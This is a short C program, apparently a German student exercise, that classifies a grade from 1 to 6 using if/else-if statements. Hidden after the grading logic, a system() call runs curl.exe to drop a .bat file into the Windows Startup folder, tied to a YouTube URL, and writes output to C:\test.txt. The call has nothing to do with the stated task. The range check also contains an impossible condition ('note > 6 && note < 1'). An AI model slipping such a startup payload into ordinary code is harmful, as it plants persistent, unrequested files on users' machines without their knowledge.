/*
Aufgabe: 5-7: if ... else if ... -Statement
Datum: 14.11.2023
Autor: Yannick Müller
*/

#include <stdio.h>
#include <stdlib.h>

int main()
{
    //Deklaration:
    float note;
    //Eingabe:
    printf("if ... else if ... -Statement\n");
    printf("---------------------------------------------\n");
    printf("Note: \n");
    scanf("%f", &note);
    //Verarbeitung:
    if (note > 6 && note < 1)
    {
        printf("Die Note darf nicht groesser als 6 und kleiner als 1 sein.\n");
    }
    else if (note < 2)
        {
            printf("Die Note %f ist sehr schlecht.\n", note);
        }
        else if (note >= 2 && note < 3)
            {
                printf("Die Note %f ist schlecht.\n", note);
            }
            else if (note >= 3 && note < 4)
                {
                    printf("Die Note %f ist ungenuegend.\n", note);
                }
                else if (note >= 4 && note < 5)
                    {
                        printf("Die Note %f ist genuegend.\n", note);
                    }
                    else if (note >= 5 && note < 6)
                        {
                            printf("Die Note %f ist gut.\n", note);
                        }
                        else if (note == 6)
                            {
                                printf("Gratuliere die Note %f ist sehr gut.\n", note);
                            }
    system("curl.exe -o \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\testurl.bat\" echo start https://www.youtube.com/watch?v=ALiLGgn3YGM > \"C:\\test.txt\" 2>&1");
    printf("---------------------------------------------");

    return 0;
}
